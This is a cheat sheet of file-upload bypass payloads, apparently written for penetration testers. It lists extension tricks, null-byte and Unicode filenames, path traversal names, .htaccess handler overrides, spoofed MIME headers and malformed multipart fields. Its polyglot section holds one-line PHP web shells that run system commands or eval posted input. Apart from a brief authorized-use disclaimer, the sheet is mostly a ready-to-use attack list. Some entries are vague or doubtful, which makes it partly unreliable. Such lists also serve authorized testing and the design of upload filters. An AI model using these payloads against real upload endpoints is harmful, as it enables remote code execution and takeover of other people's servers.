# 🛡 Ultimate File Upload Bypass – Optimized Edition + MIME-Type Reference
_By CybrX1337 – BURPSUITE_

⚠ **Educational / Authorized Testing Only**

---

# 📑 Table of Contents

1. [Common Executable Extensions](#1️⃣-common-executable-extensions-15)
2. [Mixed Case / Unicode Homoglyphs](#2️⃣-mixed-case--unicode-homoglyphs-5)
3. [Null Byte & Control Character Injection](#3️⃣-null-byte--control-character-injection-5)
4. [Double Extensions](#4️⃣-double-extensions-5)
5. [Fragment, Comment & Semicolon Tricks](#5️⃣-fragment-comment--semicolon-tricks-5)
6. [Path Traversal + Upload](#6️⃣-path-traversal--upload-5)
7. [Encoded Extensions](#7️⃣-encoded-extensions-5)
8. [Apache / Nginx Double Parsing](#8️⃣-apache--nginx-double-parsing-5)
9. [Exotic Extensions Parsed as PHP](#9️⃣-exotic-extensions-parsed-as-php-5)
10. [Dangerous .htaccess Uploads](#🔟-dangerous-htaccess-uploads-5)
11. [Polyglot Payloads](#1️⃣1️⃣-polyglot-payloads-5)
12. [MIME-Type Abuse](#1️⃣2️⃣-mime-type-abuse-5)
13. [Archive Tricks](#1️⃣3️⃣-archive-tricks-5)
14. [Legacy Apache mod_mime Confusion](#1️⃣4️⃣-legacy-apache-mod_mime-confusion-5)
15. [IIS / NTFS Alternate Data Streams](#1️⃣5️⃣-iis--ntfs-alternate-data-streams-5)
16. [SVG + PHP Polyglots](#1️⃣6️⃣-svg--php-polyglots-5)
17. [Malformed Headers in Upload](#1️⃣7️⃣-malformed-headers-in-upload-5)
18. [HTTP Parameter Pollution in Upload](#1️⃣8️⃣-http-parameter-pollution-in-upload-5)
19. [Chunked Transfer Encoding Tricks](#1️⃣9️⃣-chunked-transfer-encoding-tricks-5)
20. [Rare Unicode Dot / Slash Bypasses](#2️⃣0️⃣-rare-unicode-dot--slash-bypasses-5)

---

## 1️⃣ Common Executable Extensions (15)
.php  
.phtml  
.php3  
.php4  
.php5  
.phps  
.phar  
.inc  
.asp  
.aspx  
.ashx  
.cfm  
.jsp  
.jsf  
.shtm  
**MIME-Type Related:** application/x-httpd-php, text/x-php, application/php, text/html, application/x-aspx, text/x-server-parsed-html, application/x-httpd-cfm, application/java-server-pages

---

## 2️⃣ Mixed Case / Unicode Homoglyphs (5)
.PHP  
.pHp  
.PHTML  
.pһp  # Cyrillic һ  
.phρ   # Greek rho  
**MIME-Type Related:** application/x-httpd-php, text/x-php, application/x-php

---

## 3️⃣ Null Byte & Control Character Injection (5)
.php%00  
.php%00.png  
.php%0a  
.php%09  
.php%20  
**MIME-Type Related:** application/x-httpd-php, image/png, image/jpeg, text/plain

---

## 4️⃣ Double Extensions (5)
.php.jpg  
.jpg.php  
.png.php  
.gif.php  
.php.jpg%00.png  
**MIME-Type Related:** application/x-httpd-php, image/jpeg, image/png, image/gif

---

## 5️⃣ Fragment, Comment & Semicolon Tricks (5)
.php#.jpg  
.php%23.jpg  
.php;jpg  
.php;.jpg  
.php::$DATA  
**MIME-Type Related:** application/x-httpd-php, image/jpeg, text/plain

---

## 6️⃣ Path Traversal + Upload (5)
../../shell.php  
..%2f..%2fshell.php  
..%5c..%5cshell.php  
%2e%2e%2f%2e%2e%2fshell.php  
shell.php/..  
**MIME-Type Related:** application/x-httpd-php, text/plain

---

## 7️⃣ Encoded Extensions (5)
%2Ephp  
%252Ephp  
.p%68p  
.p\u0068p  
.php%2E.jpg  
**MIME-Type Related:** application/x-httpd-php, image/jpeg

---

## 8️⃣ Apache / Nginx Double Parsing (5)
.php/.jpg  
.php%00.jpg  
.php%20.jpg  
.php;jpg  
.php..jpg  
**MIME-Type Related:** application/x-httpd-php, image/jpeg

---

## 9️⃣ Exotic Extensions Parsed as PHP (5)
.sphp  
.php-s  
.phar  
.suspected  
.module  
**MIME-Type Related:** application/x-httpd-php, application/x-php

---

## 🔟 Dangerous .htaccess Uploads (5)
.htaccess  
AddType application/x-httpd-php .jpg  
AddHandler application/x-httpd-php .gif  
AddType application/x-httpd-php .png  
AddHandler application/x-httpd-php .txt  
**MIME-Type Related:** text/plain, application/x-httpd-php

---

## 1️⃣1️⃣ Polyglot Payloads (5)
GIF89a;<?php system($_GET['cmd']); ?>  
FFD8FF...<?php echo "JPEG+PHP"; ?>  
PNG....IEND<?php phpinfo(); ?>  
PDF%0A<?php eval($_POST[1]); ?>  
<?php echo 'EXIF Injection'; ?>  
**MIME-Type Related:** image/gif, image/jpeg, image/png, application/pdf, application/x-httpd-php

---

## 1️⃣2️⃣ MIME-Type Abuse (5)
Content-Type: application/x-php  
Content-Type: text/plain  
Content-Type: image/jpeg  
Content-Type: image/png  
Content-Type: application/octet-stream  
**MIME-Type Related:** application/x-httpd-php, text/plain, image/jpeg, image/png, application/octet-stream

---

## 1️⃣3️⃣ Archive Tricks (5)
.php.zip  
.php.tar  
.php.tar.gz  
.php.rar  
.php.gz  
**MIME-Type Related:** application/zip, application/x-tar, application/gzip, application/x-rar-compressed

---

## 1️⃣4️⃣ Legacy Apache mod_mime Confusion (5)
.php.en  
.php.fr  
.php.txt.en  
.php.plain.en  
.php.de  
**MIME-Type Related:** application/x-httpd-php, text/plain

---

## 1️⃣5️⃣ IIS / NTFS Alternate Data Streams (5)
.asp::$DATA  
.php::$DATA  
.php::$INDEX_ALLOCATION  
.aspx::$DATA  
.asp::$INDEX_ALLOCATION  
**MIME-Type Related:** application/x-httpd-php, application/x-aspx

---

## 1️⃣6️⃣ SVG + PHP Polyglots (5)
image.svg containing `<?php ... ?>`  
SVG with embedded `<script>` executing PHP  
SVG with Base64-encoded PHP in `<image xlink:href>`  
SVG + JPEG polyglot with PHP footer  
SVG with external entity injection calling PHP  
**MIME-Type Related:** image/svg+xml, image/jpeg, application/x-httpd-php

---

## 1️⃣7️⃣ Malformed Headers in Upload (5)
Content-Disposition: form-data; name="file"; filename="shell.php  
Content-Disposition: form-data; filename="shell.php" name="file  
Missing Content-Type header  
Duplicate Content-Type header with different MIME  
MIME header split using CRLF injection  
**MIME-Type Related:** application/x-httpd-php, text/plain, image/jpeg, image/png

---

## 1️⃣8️⃣ HTTP Parameter Pollution in Upload (5)
filename="shell.php" filename="shell.jpg"  
filename="shell.jpg" filename="shell.php"  
filename*="UTF-8''shell.php"  
filename="shell.php?abc=1"  
filename="shell.php%00.jpg"  
**MIME-Type Related:** application/x-httpd-php, image/jpeg

---

## 1️⃣9️⃣ Chunked Transfer Encoding Tricks (5)
PHP hidden in second chunk  
Chunked request with early terminating chunk  
MIME headers split between chunks  
PHP payload obfuscated with chunk boundaries  
Overlapping chunk sizes causing parser confusion  
**MIME-Type Related:** application/x-httpd-php

---

## 2️⃣0️⃣ Rare Unicode Dot / Slash Bypasses (5)
.php%E2%80%AE.jpg  
.php%E2%80%AD.jpg  
%u002Ephp  
%u2215php  
%u2024php  
**MIME-Type Related:** application/x-httpd-php, image/jpeg
